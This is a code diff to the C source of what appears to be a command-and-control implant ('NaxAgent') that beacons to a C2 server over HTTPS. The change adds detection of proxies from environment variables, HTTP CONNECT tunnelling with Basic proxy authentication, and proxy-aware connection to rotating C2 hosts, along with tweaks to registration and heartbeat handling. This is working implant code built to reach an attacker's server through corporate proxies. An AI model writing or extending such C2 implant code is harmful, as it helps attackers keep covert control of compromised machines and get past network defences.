@@ -366,30 +366,209 @@ static void https_rotate_host(NaxAgent *a) {
     g_cur_port = (uint16_t)a->cfg.c2_port;
 }
 
-static int https_tls_connect(NaxAgent *a)
-{
-    /* Use current rotated host */
-    const char *host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
-    uint16_t    port = g_cur_port    ? g_cur_port  : (uint16_t)a->cfg.c2_port;
+/* ===== Proxy detection and HTTP CONNECT ===== */
 
+typedef struct {
+    char host[256];
+    uint16_t port;
+    char user[128];
+    char pass[128];
+    int has_auth;
+} proxy_info_t;
+
+static proxy_info_t g_proxy = {0};
+static int g_proxy_detected = 0;
+static int g_proxy_checked  = 0;
+
+/* Base64 encode for Proxy-Authorization header */
+static int _b64_encode_proxy(const char *in, size_t in_len, char *out, size_t out_cap) {
+    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    size_t o = 0;
+    for (size_t i = 0; i < in_len; i += 3) {
+        if (o + 4 >= out_cap) return -1;
+        unsigned int v = (unsigned char)in[i] << 16;
+        if (i + 1 < in_len) v |= (unsigned char)in[i+1] << 8;
+        if (i + 2 < in_len) v |= (unsigned char)in[i+2];
+        out[o++] = t[(v >> 18) & 0x3F];
+        out[o++] = t[(v >> 12) & 0x3F];
+        out[o++] = (i + 1 < in_len) ? t[(v >> 6) & 0x3F] : '=';
+        out[o++] = (i + 2 < in_len) ? t[v & 0x3F] : '=';
+    }
+    out[o] = '\0';
+    return (int)o;
+}
+
+/* Parse proxy URL: http://user:pass@host:port or http://host:port */
+static int _parse_proxy_url(const char *url, proxy_info_t *pi) {
+    memset(pi, 0, sizeof(*pi));
+    const char *p = url;
+
+    /* Skip scheme */
+    if (strncmp(p, "http://", 7) == 0) p += 7;
+    else if (strncmp(p, "https://", 8) == 0) p += 8;
+
+    /* Check for user:pass@ */
+    const char *at = strchr(p, '@');
+    if (at) {
+        const char *colon = strchr(p, ':');
+        if (colon && colon < at) {
+            size_t ulen = (size_t)(colon - p);
+            size_t plen = (size_t)(at - colon - 1);
+            if (ulen >= sizeof(pi->user) || plen >= sizeof(pi->pass)) return -1;
+            memcpy(pi->user, p, ulen); pi->user[ulen] = '\0';
+            memcpy(pi->pass, colon + 1, plen); pi->pass[plen] = '\0';
+            pi->has_auth = 1;
+        }
+        p = at + 1;
+    }
+
+    /* Parse host:port */
+    const char *colon = strchr(p, ':');
+    const char *slash = strchr(p, '/');
+    if (colon) {
+        size_t hlen = (size_t)(colon - p);
+        if (hlen >= sizeof(pi->host)) return -1;
+        memcpy(pi->host, p, hlen); pi->host[hlen] = '\0';
+        pi->port = (uint16_t)atoi(colon + 1);
+    } else {
+        size_t hlen = slash ? (size_t)(slash - p) : strlen(p);
+        if (hlen >= sizeof(pi->host)) return -1;
+        memcpy(pi->host, p, hlen); pi->host[hlen] = '\0';
+        pi->port = 8080;
+    }
+    return (pi->host[0] && pi->port) ? 0 : -1;
+}
+
+/* Detect proxy from environment variables */
+static void _detect_proxy(void) {
+    if (g_proxy_checked) return;
+    g_proxy_checked = 1;
+
+    const char *env = getenv("https_proxy");
+    if (!env) env = getenv("HTTPS_PROXY");
+    if (!env) env = getenv("http_proxy");
+    if (!env) env = getenv("HTTP_PROXY");
+    if (!env) return;
+
+    if (_parse_proxy_url(env, &g_proxy) == 0) {
+        g_proxy_detected = 1;
+        DBG("proxy detected: %s:%u (auth=%s)",
+            g_proxy.host, g_proxy.port, g_proxy.has_auth ? "yes" : "no");
+    }
+}
+
+/* Connect TCP to a host:port */
+static int _tcp_connect(const char *host, uint16_t port) {
     char port_str[8];
     snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);
 
     struct addrinfo hints = {0}, *res = NULL;
     hints.ai_family   = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
-    hints.ai_flags    = AI_NUMERICHOST;
-    if (getaddrinfo(host, port_str, &hints, &res) != 0) {
-        return -1;
-    }
+    if (getaddrinfo(host, port_str, &hints, &res) != 0) return -1;
+
     int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
     if (sock < 0) { freeaddrinfo(res); return -1; }
-    struct timeval tv = {5, 0};
+
+    struct timeval tv = {10, 0};
     setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
     if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
         close(sock); freeaddrinfo(res); return -1;
     }
     freeaddrinfo(res);
+    return sock;
+}
+
+/* Send HTTP CONNECT through proxy and wait for 200 */
+static int _proxy_connect(int sock, const char *target_host, uint16_t target_port) {
+    char req[1024];
+    int rlen;
+
+    if (g_proxy.has_auth) {
+        /* Build "user:pass" and base64 encode it */
+        char cred[256];
+        int clen = snprintf(cred, sizeof(cred), "%s:%s", g_proxy.user, g_proxy.pass);
+        char b64[512];
+        _b64_encode_proxy(cred, (size_t)clen, b64, sizeof(b64));
+        memset(cred, 0, sizeof(cred)); /* zero credentials */
+
+        rlen = snprintf(req, sizeof(req),
+            "CONNECT %s:%u HTTP/1.1\r\n"
+            "Host: %s:%u\r\n"
+            "Proxy-Authorization: Basic %s\r\n"
+            "\r\n",
+            target_host, target_port,
+            target_host, target_port,
+            b64);
+        memset(b64, 0, sizeof(b64));
+    } else {
+        rlen = snprintf(req, sizeof(req),
+            "CONNECT %s:%u HTTP/1.1\r\n"
+            "Host: %s:%u\r\n"
+            "\r\n",
+            target_host, target_port,
+            target_host, target_port);
+    }
+
+    /* Send CONNECT request */
+    const char *p = req;
+    int rem = rlen;
+    while (rem > 0) {
+        ssize_t n = send(sock, p, rem, 0);
+        if (n <= 0) return -1;
+        p += n; rem -= (int)n;
+    }
+
+    /* Read response — look for "HTTP/1.x 200" */
+    char resp[1024];
+    int total = 0;
+    while (total < (int)sizeof(resp) - 1) {
+        ssize_t n = recv(sock, resp + total, 1, 0);
+        if (n <= 0) return -1;
+        total += (int)n;
+        /* Check if we got the end of headers */
+        if (total >= 4 &&
+            resp[total-4] == '\r' && resp[total-3] == '\n' &&
+            resp[total-2] == '\r' && resp[total-1] == '\n') break;
+    }
+    resp[total] = '\0';
+
+    /* Verify 200 status */
+    if (strncmp(resp, "HTTP/1.", 7) != 0) return -1;
+    int status = atoi(resp + 9);
+    if (status != 200) {
+        DBG_ERR("proxy CONNECT failed: status %d", status);
+        return -1;
+    }
+
+    DBG("proxy CONNECT tunnel established to %s:%u", target_host, target_port);
+    return 0;
+}
+
+static int https_tls_connect(NaxAgent *a)
+{
+    /* Use current rotated host */
+    const char *host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
+    uint16_t    port = g_cur_port    ? g_cur_port  : (uint16_t)a->cfg.c2_port;
+
+    /* Detect proxy on first connection attempt */
+    _detect_proxy();
+
+    int sock;
+    if (g_proxy_detected) {
+        /* Connect to proxy, then HTTP CONNECT tunnel to C2 */
+        sock = _tcp_connect(g_proxy.host, g_proxy.port);
+        if (sock < 0) return -1;
+        if (_proxy_connect(sock, host, port) < 0) {
+            close(sock); return -1;
+        }
+    } else {
+        /* Direct connection to C2 */
+        sock = _tcp_connect(host, port);
+        if (sock < 0) return -1;
+    }
     if (!g_ssl_ctx) {
         g_ssl_ctx = SSL_CTX_new(TLS_client_method());
         if (!g_ssl_ctx) { close(sock); return -1; }
@@ -818,7 +997,7 @@ void nax_https_main(NaxAgent *a)
 
             uint32_t resp_len = 0;
             DBG_SEC("REGISTER");
-            DBG("sending REGISTER (pre-profile) to %s", a->cfg.c2_host);
+            DBG("sending REGISTER (pre-profile) to %s", g_cur_host[0] ? g_cur_host : a->cfg.c2_host);
             uint8_t *resp = https_post(a, enc, enc_len, 0 /*pre-profile*/, &resp_len);
             free(enc);
 
@@ -861,7 +1040,7 @@ void nax_https_main(NaxAgent *a)
         }
         if (!a->running) break;
 
-        int hb_host_ok = 0;
+        int hb_host_ok = 1; /* reuse REGISTER connection for first heartbeat */
         while (a->running) {
             if (!hb_host_ok) {
                 https_rotate_host(a);
@@ -890,7 +1069,7 @@ void nax_https_main(NaxAgent *a)
             uint8_t *resp = https_get(a, hb_enc, hb_enc_len, &resp_len);
             DBG("→ GET %s (host=%s sleep=%ums jitter=%u%%)",
                 nax_profile_get_uri(),
-                a->cfg.c2_host, a->cfg.sleep_ms, a->cfg.jitter_pct);
+                g_cur_host[0] ? g_cur_host : a->cfg.c2_host, a->cfg.sleep_ms, a->cfg.jitter_pct);
             free(hb_enc);
 
             if (!resp) {
